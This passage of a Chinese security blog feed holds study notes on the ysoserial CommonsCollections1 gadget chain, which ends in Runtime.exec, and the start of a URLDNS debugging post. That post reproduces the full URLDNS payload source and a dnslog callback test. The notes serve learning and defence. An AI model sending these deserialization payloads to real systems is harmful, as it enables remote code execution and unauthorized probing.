class=\"markdownIt-Anchor\" href=\"#最后康康proxy\">#</a> 最后康康 proxy</h4>\n<p>为什么会利用到对象代理呢？</p>\n<p>当然是因为代理的一些些特性辣</p>\n<p>每个代理类有一个公共构造一个参数，该接口的实现 <code>InvocationHandler</code>  ，设置调用处理程序的代理实例</p>\n<p>康康构造方法，会传入一个 InvocationHandler 对象</p>\n<p>并且在调用该代理对象任意方法时，会调用 InvocationHandler#invoke ()</p>\n<p><img src=\"63.png\" alt=\"\"></p>\n<p>但是该方法是 protected 的，很明显我们需要实例化一个代理对象时需要找到另一个可以返回实例的方法</p>\n<p>那就是 newProxyInstance 方法啦</p>\n<p><img src=\"64.png\" alt=\"\"></p>\n<p>来测试试试</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * My Test Class</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestInvocationHandler handler = <span class=\"keyword\">new</span> TestInvocationHandler();</span><br><span class=\"line\">        Map testProxy = (Map) Proxy.newProxyInstance(Gadgets.class.getClassLoader(), <span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;, handler);</span><br><span class=\"line\">        testProxy.put(<span class=\"string\">&quot;key&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestInvocationHandler</span> <span class=\"keyword\">implements</span> <span class=\"title\">InvocationHandler</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;method: &quot;</span> + method.toString());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>debug 代码，可以看见当调用 Map#put 时，会进入 TestInvocationHandler#invoke</p>\n<p><img src=\"65.png\" alt=\"\"></p>\n<p>没戳 proxy 利用到的点就这一个啦</p>\n<h3 id=\"调试\"><a class=\"markdownIt-Anchor\" href=\"#调试\">#</a> 调试</h3>\n<p>比较绕的地方调试一波</p>\n<p><img src=\"36.png\" alt=\"\"></p>\n<p>进入该函数，发现有两处函数计算</p>\n<p><img src=\"37.png\" alt=\"\"></p>\n<p>进入 <code>createMemoizedInvocationHandler(map)</code></p>\n<p>其中 <code>ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</code></p>\n<p>可以看出此处是通过反射获取 AnnotationInvocationHandler 对象，且获取对象时传入了构造的 LazyMap</p>\n<p><img src=\"38.png\" alt=\"\"></p>\n<p>进入 <code>createProxy(handler,iface,ifaces)</code></p>\n<p>对传入的 iface 进行代理，并传入上一步获得的 AnnotationInvocationHandler 对象 handler2</p>\n<p>iface 为传入的 Map.class (CommonsCollections1.java 中： <code>mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</code> ）</p>\n<p><img src=\"39.png\" alt=\"\"></p>\n<p>两次函数执行完毕后，返回 CommonsCollections1</p>\n<p>返回代理对象 mapProxy（调用该对象任意方法，都会先调用传入的 handler#invoke）</p>\n<p>73 行代码将获取到的 mapProxy 进行包裹是因为：</p>\n<p>​\t由于反序列化入口为 readObject，所以我们需要某个类的 readObject 中会调用传入 map 的任意方法</p>\n<p>​\tAnnotationInvocationHandler#readObject 中有调用 map.entrySet ()</p>\n<p>​\t从而触发 AnnotationInvocationHandler#invoke</p>\n<p><img src=\"40.png\" alt=\"\"></p>\n<p>最后返回层层构造好的，还没有序列化的，payload 啦</p>\n<h2 id=\"payload触发分析\"><a class=\"markdownIt-Anchor\" href=\"#payload触发分析\">#</a> payload 触发分析</h2>\n<p>以下是 POC 中给出的触发链，可以根据 Gadget 下断点（这样比较清晰感觉）</p>\n<p>根据上面 payload 构造的学习，我们可以更好的理解该利用链的触发</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<p>首先从 PayloadRunner38 行进入反序列化</p>\n<p>其中 serialized 是我们序列化后的 payload</p>\n<p><img src=\"41.png\" alt=\"\"></p>\n<p>进入 ObjectInputStream#readObject</p>\n<p><img src=\"42.png\" alt=\"\"></p>\n<p>在 AnnotationInvocationHandler#readObject 处下断点，查看调用栈</p>\n<p>观察到在 ObjectInputStream 中通过反射调用了 AnnotationInvocationHandler#readObject</p>\n<p><img src=\"43.png\" alt=\"\"></p>\n<p>进入 AnnotationInvocationHandler#readObject</p>\n<p>此处 memberValues 为我们传入的代理对象 proxyMap</p>\n<p><img src=\"45.png\" alt=\"\"></p>\n<p>调用其任意方法，就会进入 AnnotationInvocationHandler#invoke</p>\n<p>这里要进入函数一直点点点，其中会多次返回该行</p>\n<p><img src=\"46.png\" alt=\"\"></p>\n<p>直到再次进入 AnnotationInvocationHandler#readObject，运行至 355 行进入函数，会跳转至 AnnotationInvocationHandler#invoke</p>\n<p><img src=\"47.png\" alt=\"\"></p>\n<p>查看当前函数调用栈</p>\n<p>handler1 的 readObject -&gt; 代理对象的 entrySet -&gt; handler2 的 invoke</p>\n<p><img src=\"48.png\" alt=\"\"></p>\n<p>构造 handler2 时，传入的 Map 对象就是我们构造好的 LazyMap</p>\n<p>此时只要有调用 LazyMap#get，就会执行 transform</p>\n<p>查看当前变量，this.memberValues 就是 LazyMap 对象</p>\n<p><img src=\"49.png\" alt=\"\"></p>\n<p>往下滑滑滑滑滑</p>\n<p>在 78 行找到 <code>this.memberValues.get(var4)</code>  啦</p>\n<p><img src=\"50.png\" alt=\"\"></p>\n<p>调试进入 LazyMap#get，其中当获取的 key 不存在时，会进入 if 代码块调用我们构造好的 transform</p>\n<p><img src=\"51.png\" alt=\"\"></p>\n<p>查看变量，执行的 transform 就是我们构造好的，会通过反射获取函数执行命令</p>\n<p><img src=\"53.png\" alt=\"\"></p>\n<p>查看函数调用栈，和分析中相同</p>\n<p><img src=\"52.png\" alt=\"\"></p>\n<p>调到这里就完成触发啦:happy:</p>\n<p>⭐碰见了很多奇奇怪怪的问题，比如根本不会跳进 LazyMap#get 中 if 中的代码块，或者还没到这就已经弹窗了，或者细调时根本不会弹窗… 困扰了我很久😪</p>\n<p>但是正常运行是没有问题的，所以我取消了所有除此之外的断点，查看函数调用栈和变量都 OK 了</p>\n<p>所以感觉应该是 debug 在实现自身功能时有影响到正常代码的触发，这里说明一下啦</p>\n<h1 id=\"哔哔哔口水总结\"><a class=\"markdownIt-Anchor\" href=\"#哔哔哔口水总结\">#</a> 哔哔哔口水总结</h1>\n<p>看 p 神的文章，一点一点仔细看了一遍</p>\n<p><img src=\"54.png\" alt=\"\"></p>\n<p>然后脑袋瓜子就糊了</p>\n<p><img src=\"55.jpg\" alt=\"\"></p>\n<p>然后就从 URLDNS 开始再看一遍</p>\n<p>然后发现哇塞</p>\n<p>URLDNS 真的好简单耶</p>\n<p>怎么会有人看不懂这么简单的原理呀不会把不会吧</p>\n<p><img src=\"57.jpg\" alt=\"\"></p>\n<p>然后看 cc1，把 payload 原理又看了一遍，什么 transform 也太简单了把，不就是这样吗，这有什么难度吗？？？</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>然后看触发原理调试的时候就是这样了 (beiwei)</p>\n<p><img src=\"59.png\" alt=\"\"></p>\n<p>由其是还碰见了调试上的问题</p>\n<p>左左右右调试了一两个星期把</p>\n<p><img src=\"60.jpeg\" alt=\"\"></p>\n<p>一直想把整个过程简洁优雅的总结出来，所以不断地总结总结，画图记笔记…</p>\n<p>因为能简单的把问题解释清楚才能证明自己是真的理解了（不然就和第一遍看 p 大文章的情况一样了）</p>\n<p>然后调完了理解了总结了记笔记了，我又行了</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>这也太简单了吧</p>\n<p>不会吧不会吧会难道还有人看不懂 cc1 吗</p>\n<p>以上作死的行为只是想提醒自己，很多很难的知识点一定要自己动手去试，多总结，一定要写文章记录下来（年纪大了真的会忘的），细节不要放过，一点一点抠</p>\n<p>我真的不是小天才，我只是个小神仙罢了，唉</p>\n<p><img src=\"61.gif\" alt=\"\"></p>\n<p>下图是在理解触发原理时自己写的一个大概的流程（尽量简洁但是不是很简洁）</p>\n<p>看不看得懂就看缘分了😴</p>\n<p><img src=\"60.png\" alt=\"\"></p>\n",
            "tags": [
                "Java反序列化"
            ]
        },
        {
            "id": "http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/",
            "title": "ysoserial之URLDNS调试",
            "date_published": "2021-08-25T03:38:45.000Z",
            "content_html": "<h1 id=\"利用链简述\"><a class=\"markdownIt-Anchor\" href=\"#利用链简述\">#</a> 利用链简述</h1>\n<ol>\n<li>触发结果为一次 DNS 请求，适用目标无回显情况</li>\n<li>使用 java 内置类构造，无第三方库依赖</li>\n</ol>\n<h1 id=\"urldns利用代码\"><a class=\"markdownIt-Anchor\" href=\"#urldns利用代码\">#</a> URLDNS 利用代码</h1>\n<p>poc：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> ysoserial.payloads;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.InetAddress;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLStreamHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Reflections;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class=\"line\"><span class=\"comment\"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   This was inspired by  Philippe Arteau <span class=\"doctag\">@h</span>3xstream, who wrote a blog</span></span><br><span class=\"line\"><span class=\"comment\"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class=\"line\"><span class=\"comment\"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class=\"line\"><span class=\"comment\"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class=\"line\"><span class=\"comment\"> *   standard JDK classes.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class=\"line\"><span class=\"comment\"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class=\"line\"><span class=\"comment\"> *   during a comparison (either equals or hashCode).</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class=\"line\"><span class=\"comment\"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class=\"line\"><span class=\"comment\"> *   it to trigger a DNS lookup.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   Gadget Chain:</span></span><br><span class=\"line\"><span class=\"comment\"> *     HashMap.readObject()</span></span><br><span class=\"line\"><span class=\"comment\"> *       HashMap.putVal()</span></span><br><span class=\"line\"><span class=\"comment\"> *         HashMap.hash()</span></span><br><span class=\"line\"><span class=\"comment\"> *           URL.hashCode()</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@Dependencies()</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">URLDNS</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">Object</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String url)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//Avoid DNS resolution during payload creation</span></span><br><span class=\"line\">                <span class=\"comment\">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class=\"line\">                URLStreamHandler handler = <span class=\"keyword\">new</span> SilentURLStreamHandler();</span><br><span class=\"line\"></span><br><span class=\"line\">                HashMap ht = <span class=\"keyword\">new</span> HashMap(); <span class=\"comment\">// HashMap that will contain the URL</span></span><br><span class=\"line\">                URL u = <span class=\"keyword\">new</span> URL(<span class=\"keyword\">null</span>, url, handler); <span class=\"comment\">// URL to use as the Key</span></span><br><span class=\"line\">                ht.put(u, url); <span class=\"comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                Reflections.setFieldValue(u, <span class=\"string\">&quot;hashCode&quot;</span>, -<span class=\"number\">1</span>); <span class=\"comment\">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">return</span> ht;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">                PayloadRunner.run(URLDNS.class, args);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class=\"line\"><span class=\"comment\">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class=\"line\"><span class=\"comment\">         * using the serialized object.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class=\"line\"><span class=\"comment\">         * second resolution.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SilentURLStreamHandler</span> <span class=\"keyword\">extends</span> <span class=\"title\">URLStreamHandler</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">protected</span> URLConnection <span class=\"title\">openConnection</span><span class=\"params\">(URL u)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">synchronized</span> InetAddress <span class=\"title\">getHostAddress</span><span class=\"params\">(URL u)</span> </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>链接：<a href=\"https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java\">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>\n<h1 id=\"调试分析\"><a class=\"markdownIt-Anchor\" href=\"#调试分析\">#</a> 调试分析</h1>\n<p>项目链接：<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<p>打开 idea，找到 URLDNS 入口：ysosertial-&gt;src-&gt;main-&gt;java-&gt;ysoserial-&gt;payloads-&gt;URLDNS.java-&gt;main ()</p>\n<h2 id=\"运行尝试\"><a class=\"markdownIt-Anchor\" href=\"#运行尝试\">#</a> 运行尝试</h2>\n<p>直接运行 main 函数，发现默认传入的命令为 calc.exe</p>\n<p>报错：URL 初始化失败，找不到 calc.exe 协议</p>\n<p><img src=\"1.png\" alt=\"\"></p>\n<p>最后一行报错信息指向 main 函数，倒数第二行报错信息指向 PayloadRunner</p>\n<p>说明为传入参数 args 有误，应为 URL，也是我们要发送请求的地址</p>\n<p>打开 dnslog，获取到地址为：<a href=\"http://ghtzjz.dnslog.cn\">ghtzjz.dnslog.cn</a></p>\n<p><img src=\"2.png\" alt=\"\"></p>\n<p>编辑传入参数，<a href=\"http://ghtzjz.dnslog.cn\">http://ghtzjz.dnslog.cn</a></p>\n<p><img src=\"3.png\" alt=\"\"></p>\n<p><img src=\"4.png\" alt=\"\"></p>\n<p>再次运行 main ()，payload 为我们传入的参数</p>\n<p><img src=\"5.png\" alt=\"\"></p>\n<p>刷新 dnslog 的请求记录，发现接收到了请求，利用成功</p>\n<p><img src=\"6.png\" alt=\"\"></p>\n<h2 id=\"代码调试\"><a class=\"markdownIt-Anchor\" href=\"#代码调试\">#</a> 代码调试</h2>\n<p>我们从 main 函数一步一步调试，会发现 URLDNS 在 main 中调用 PayloadRunner#run ()</p>\n<p>然后 PayloadRunner#run () 中调用 URLDNS#getObject ()</p>\n<p>URLDNS#getObject () 中的 HashMap <strong>ht</strong> 就是我们要生成的（未序列化）payload</p>\n<p><img src=\"13.png\" alt=\"\"></p>\n<p>getObeject 方法中，创建了一个 URL 对象（存储我们输入的 dns 地址）–&gt; 再将 URL 对象放入 HashMap 中</p>\n<p>下面一行的注释写道，在上面的 put 过程中，计算并缓存了 URL 的 hashCode; 这将重置它，以便下次调用 hashCode 时将触发 DNS 查找</p>\n<p>那么在 ht.put 时，我们进入 HashMap 查看，发现 key 进行了 hash 计算</p>\n<p>（这里插播一条小道消息，点击这个调试可以返回上一步<img src=\"14.png\" style=\"zoom:90%;\" />)</p>\n<p><img src=\"15.png\" alt=\"\"></p>\n<p>在这里就是我们的 URL 对象进行了 hash 计算</p>\n<p>hash 计算前的 URL 对象：</p>\n<p><img src=\"16.png\" alt=\"\"></p>\n<p>hash 计算后的对象（就是对象中的 hashCode 变量发生了变化嘛）：</p>\n<p><img src=\"19.png\" alt=\"\"></p>\n<p>进入下一行代码，Reflections.setFieldValue 是什么呢？</p>\n<p>看名字就是一个通过反射设置成员变量值的功能😀</p>\n<p>进入函数内部，是要设置传入对象的成员变量 hashCode 的值</p>\n<p><img src=\"17.png\" alt=\"\"></p>\n<p>查看变量值，传入对象是包含 payload 的 URL 对象，要将它的 hashCode 值设置为 - 1</p>\n<p><img src=\"18.png\" alt=\"\"></p>\n<p>执行完这行代码，发现变量 u 和 ht 中存储的 URL 对象的 hashCode 值都变为 - 1 了</p>\n<p><img src=\"20.png\" alt=\"\"></p>\n<p>然后返回 ht，也就是更改过存储 key 的 hashCode 值的 HashMap</p>\n<p>再次进入 PalodRunner#run，返回的 HashMap 赋值给 objBefore，再将其序列化赋值给 ser</p>\n<p><img src=\"21.png\" alt=\"\"></p>\n<p>Utils.releasePayload (payload, objBefore) 应该是释放资源的代码（不用在意，和最后返回值无关）</p>\n<p>最后返回 ser，即将 ser 值赋给变量 serialized，所以 serialized 就是序列化后的 payload</p>\n<p><strong>终于！开始反序列化触发漏洞了！</strong></p>\n<p>从这里进入反序列化函数</p>\n<p><img src=\"22.png\" alt=\"\"></p>\n<p>代码注释中说明，<strong>利用链从 HashMap#readObject () 进入，直到进入 URL#hashCode () 触发 DNS 请求</strong></p>\n<blockquote>\n<p>Gadget Chain:</p>\n<ul>\n<li>\n<pre><code>HashMap.readObject()\n</code></pre>\n</li>\n<li>\n<pre><code>HashMap.putVal()\n</code></pre>\n</li>\n<li>\n<pre><code>HashMap.hash()\n</code></pre>\n</li>\n<li>\n<pre><code>URL.hashCode()\n</code></pre>\n</li>\n</ul>\n</blockquote>\n<p>那我们就一直点点点直接看见 readObject</p>\n<p>好了过了没看见嘤嘤嘤</p>\n<p>直接去 Hash#readObject 处下个断点</p>\n<p><img src=\"23.png\" alt=\"\"></p>\n<p>往下翻翻就会看见一段代码，又看见了熟悉的单词，hash</p>\n<p><img src=\"24.png\" alt=\"\"></p>\n<p>根据利用链我们可知触发漏洞的 hashCode () 就在 hash () 中，我们进入该函数</p>\n<p><img src=\"25.png\" alt=\"\"></p>\n<p>到达 URL#hashCode，果然其中有 key.hashCode ()</p>\n<p>因为我们在构造 payload 时将 hashCode 赋值为 - 1，所以不会进入 if 而是执行下面的代码</p>\n<p>调用 URLStreamHandler#hashCode</p>\n<p><img src=\"26.png\" alt=\"\"></p>\n<p>进入 URLStreamHandler#hashCode</p>\n<p>根据 p 神的文章所言，getHostAddress 中有一行代码</p>\n<blockquote>\n<p>InetAddress.getByName(host) ;</p>\n</blockquote>\n<p>其作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询，整个触发过程就已经完成啦</p>\n<p><img src=\"27.png\" alt=\"\"></p>\n<p><img src=\"28.png\" 